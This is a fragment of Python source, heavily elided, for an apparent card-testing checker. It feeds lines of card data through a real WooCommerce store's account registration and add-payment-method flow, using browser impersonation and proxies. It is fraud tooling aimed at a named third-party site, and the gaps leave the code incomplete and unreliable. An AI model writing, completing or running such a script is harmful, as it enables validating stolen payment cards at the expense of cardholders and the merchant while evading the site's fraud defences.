    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome139", proxies=proxies) as session:
            try:
                ...
                headers_main = {
                    "referer": "https://wrapenvyacademy.com/my-account/",
                }
                resp_main = await session.get(
                    "https://wrapenvyacademy.com/my-account/",
                ...
                headers_register = {
                    "origin": "https://wrapenvyacademy.com",
                    "referer": "https://wrapenvyacademy.com/my-account/",
                ...
                data_register = {
                    ...
                    "wc_order_attribution_session_entry": "https://wrapenvyacademy.com/my-account/",
                ...
                headers_address = {
                    "referer": "https://wrapenvyacademy.com/my-account/edit-address/",
                }
                resp_address = await session.get(
                    "https://wrapenvyacademy.com/my-account/edit-address/billing/",
                ...
                headers_update = {
                    "origin": "https://wrapenvyacademy.com",
                    "referer": "https://wrapenvyacademy.com/my-account/edit-address/billing/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_update = {
                ...
                headers_payment = {
                    "referer": "https://wrapenvyacademy.com/my-account/payment-methods/",
                }
                resp_payment = await session.get(
                    "https://wrapenvyacademy.com/my-account/add-payment-method/",
                ...
                headers_ajax = {
                    "origin": "https://wrapenvyacademy.com",
                    "referer": "https://wrapenvyacademy.com/my-account/add-payment-method/",
                ...
                await session.post(
                    "https://wrapenvyacademy.com/wp-admin/admin-ajax.php",
...
async def process_SQ_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
